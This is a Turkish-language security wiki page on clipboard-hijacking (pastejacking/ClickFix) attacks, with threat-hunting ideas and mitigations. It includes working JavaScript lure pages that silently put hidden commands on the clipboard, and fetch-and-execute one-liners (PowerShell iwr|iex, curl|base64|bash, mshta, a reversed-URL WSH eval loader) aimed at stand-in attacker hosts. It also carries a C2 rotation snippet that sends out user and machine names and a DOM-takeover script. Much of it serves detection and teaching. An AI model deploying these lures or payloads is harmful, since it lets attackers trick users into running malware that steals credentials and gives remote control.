# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Kendinizin kopyalamadığı hiçbir şeyi yapıştırmayın." – eski ama hala geçerli tavsiye

## Genel Bakış

Clipboard hijacking – diğer adıyla *pastejacking* – kullanıcıların komutları incelemeden rutin olarak kopyala-yapıştır yapma alışkanlığından faydalanır. Kötü amaçlı bir web sayfası (veya Electron veya masaüstü uygulaması gibi herhangi bir JavaScript yetenekli ortam), programatik olarak saldırganın kontrolündeki metni sistem panosuna yerleştirir. Kurbanlar genellikle özenle hazırlanmış sosyal mühendislik yönergeleriyle **Win + R** (Çalıştır iletişim kutusu), **Win + X** (Hızlı Erişim / PowerShell) tuşlarına basmaya veya bir terminal açıp panodaki içeriği *yapıştırmaya* teşvik edilir; bu, rastgele komutların derhal çalıştırılmasına yol açar.

Çünkü **hiçbir dosya indirilmez ve hiçbir ek açılmaz**, bu teknik ekleri, macros veya doğrudan komut yürütmesini izleyen çoğu e-posta ve web içeriği güvenlik kontrolünü atlatır. Bu nedenle saldırı, NetSupport RAT, Latrodectus loader veya Lumma Stealer gibi yaygın malware ailelerini dağıtan phishing kampanyalarında popülerdir.

## JavaScript Kavram Kanıtı
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Eski kampanyalar `document.execCommand('copy')` kullanıyordu, yenileri ise asenkron **Clipboard API** (`navigator.clipboard.writeText`) üzerine dayanıyor.

## ClickFix / ClearFake Akışı

1. Kullanıcı bir typosquatted veya compromised siteyi ziyaret eder (ör. `docusign.sa[.]com`)
2. Enjekte edilen **ClearFake** JavaScript'i `unsecuredCopyToClipboard()` yardımcı fonksiyonunu çağırır; bu fonksiyon clipboard'a Base64-encoded PowerShell tek satırlık bir komutu sessizce kaydeder.
3. HTML talimatları kurbana şunu söyler: *“Sorunu çözmek için **Win + R** tuşlarına basın, komutu yapıştırın ve Enter'a basın.”*
4. `powershell.exe` çalışır, meşru bir yürütülebilir dosya ile kötü amaçlı bir DLL içeren bir arşiv indirir (classic DLL sideloading).
5. Yükleyici ilave aşamaları deşifre eder, shellcode enjekte eder ve persistence kurar (ör. scheduled task) – nihayetinde NetSupport RAT / Latrodectus / Lumma Stealer'ı çalıştırır.

### Örnek NetSupport RAT Zinciri
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (meşru Java WebStart) bulunduğu dizinde `msvcp140.dll` arar.
* Kötü amaçlı DLL API'leri **GetProcAddress** ile dinamik olarak çözer, iki ikili dosya (`data_3.bin`, `data_4.bin`) indirir (**curl.exe** aracılığıyla), bunları rolling XOR key `"https://google.com/"` ile çözer, nihai shellcode'u enjekte eder ve **client32.exe** (NetSupport RAT)'ı `C:\ProgramData\SecurityCheck_v1\` dizinine açar.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. `la.txt` dosyasını **curl.exe** ile indirir
2. **cscript.exe** içinde JScript downloader'ı çalıştırır
3. Bir MSI payload alır → imzalı bir uygulamanın yanına `libcef.dll` bırakır → DLL sideloading → shellcode → Latrodectus.

### MSHTA aracılığıyla Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** çağrısı gizli bir PowerShell betiği başlatır; bu betik `PartyContinued.exe` dosyasını alır, `Boat.pst` (CAB) dosyasını çıkarır, `extrac32` ve dosya birleştirme ile `AutoIt3.exe`'yi yeniden oluşturur ve son olarak tarayıcı kimlik bilgilerini `sumeriavgv.digital` adresine exfiltrate eden bir `.a3x` betiğini çalıştırır.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Bazı ClickFix kampanyaları dosya indirmelerini tamamen atlayıp kurbanlara WSH aracılığıyla JavaScript çekip çalıştıran, kalıcılık sağlayan ve C2'yi günlük olarak değiştiren tek satırlık bir kodu yapıştırmalarını söyler. Gözlemlenen örnek zincir:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ana özellikler
- Obfuscated URL çalışma zamanında ters çevrilir, yüzeysel incelemeyi engellemek için.
- JavaScript kendini Startup LNK (WScript/CScript) aracılığıyla kalıcı hale getirir ve C2'yi geçerli güne göre seçer – hızlı domain rotation'a olanak tanır.

Tarihe göre C2'leri döndürmek için kullanılan minimal JS fragmenti:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Bir sonraki aşamada genellikle persistence kuran bir loader dağıtılır ve bir RAT (ör. PureHVNC) indirilir; sıkça TLS'i sabit kodlanmış bir sertifikaya pinler ve trafiği parçalara böler.

Detection ideas specific to this variant
- İşlem ağacı: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (veya `cscript.exe`).
- Başlangıç izleri: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` WScript/CScript'i `%TEMP%`/`%APPDATA%` altındaki bir JS yoluyla çağırıyor.
- Registry/RunMRU ve komut satırı telemetrisi içinde `.split('').reverse().join('')` veya `eval(a.responseText)` içeren girdiler.
- Uzun komut satırlarından kaçınmak için büyük stdin payload'ları ile beslenen tekrarlanan `powershell -NoProfile -NonInteractive -Command -`.
- Sonrasında LOLBins çalıştıran Zamanlanmış Görevler, örneğin bir updater görünümlü görev/yol altında `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` (örn. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Günlük dönen C2 host adları ve `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern'ine sahip URL'ler.
- Clipboard yazma olaylarını takip edip ardından Win+R yapıştırma ve hemen `powershell.exe` çalıştırılması ile korelasyon.

Blue-teams clipboard, işlem-oluşturma ve kayıt defteri telemetrilerini birleştirerek pastejacking kötüye kullanımını tespit edebilir:

* Windows Kayıt Defteri: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` **Win + R** komutlarının geçmişini tutar – alışılmadık Base64 / obfuske girdilere bakın.
* Güvenlik Olayı ID **4688** (Process Creation) donde `ParentImage` == `explorer.exe` ve `NewProcessName` { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } içinde.
* Event ID **4663**: şüpheli 4688 olayından hemen önce `%LocalAppData%\Microsoft\Windows\WinX\` veya geçici klasörler altındaki dosya oluşturma olayları.
* EDR clipboard sensörleri (mevcutsa) – `Clipboard Write` ile hemen ardından yeni bir PowerShell sürecinin korele edilmesi.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Son kampanyalar, kullanıcıları clipboard'larındaki OS-özel komutları yerel konsollara yapıştırmaya zorlayan sahte CDN/browser doğrulama sayfalarını ("Just a moment…", IUAM-style) seri olarak üretiyor. Bu, yürütmeyi tarayıcı sandbox'ının dışına çıkarır ve Windows ile macOS üzerinde çalışır.

Key traits of the builder-generated pages
- `navigator.userAgent` ile OS tespiti yapılarak payloadlar (Windows PowerShell/CMD vs. macOS Terminal) uyarlanır. Desteklenmeyen OS'ler için yanıltma/no-op'lar isteğe bağlıdır, ilizyonu korumak için.
- Güvenli görünen UI eylemleri (checkbox/Copy) sırasında otomatik clipboard-copy; görünür metin clipboard içeriğinden farklı olabilir.
- Mobil engelleme ve adım adım talimat içeren bir popover: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- İsteğe bağlı obfuscation ve tek dosyalık injector, ele geçirilmiş bir sitenin DOM'unu Tailwind-styled bir doğrulama UI ile üzerine yazmak için (yeni bir domain kaydı gerekli değil).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence: ilk çalıştırma
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` kullanın; böylece terminal kapandıktan sonra yürütme devam eder ve görünür izleri azaltır.

Ele geçirilmiş sitelerde in-place page takeover
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAM-style lures'e özgü Detection & hunting fikirleri
- Web: Doğrulama widget'larına Clipboard API bağlayan sayfalar; görüntülenen metin ile clipboard payload arasında uyumsuzluk; `navigator.userAgent` bazlı dallanma; şüpheli bağlamlarda Tailwind + single-page replace.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` tarayıcı etkileşiminden kısa süre sonra; batch/MSI installer'ların `%TEMP%`'den çalıştırılması.
- macOS endpoint: Terminal/iTerm'in tarayıcı olaylarına yakın zamanda `bash`/`curl`/`base64 -d` ile `nohup` spawn etmesi; terminal kapandıktan sonra arka plan işlerinin devam etmesi.
- `RunMRU` Win+R geçmişi ve clipboard yazmalarını, ardından oluşan console process'lerle korele edin.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Önlemler

1. Browser hardening – clipboard write-access'ı devre dışı bırakın (`dom.events.asyncClipboard.clipboardItem` vb.) veya kullanıcı etkileşimi gerektirin.
2. Güvenlik farkındalığı – kullanıcılara hassas komutları *yazmalarını* veya önce bir metin editörüne yapıştırmalarını öğretin.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control ile rastgele one-liner'ları engelleyin.
4. Ağ kontrolleri – bilinen pastejacking ve malware C2 domain'lerine giden çıkış isteklerini engelleyin.

## İlgili Tricks

* **Discord Invite Hijacking** genellikle kullanıcıları kötü amaçlı bir server'a çekip aynı ClickFix yaklaşımını sömürür:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Kaynaklar

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
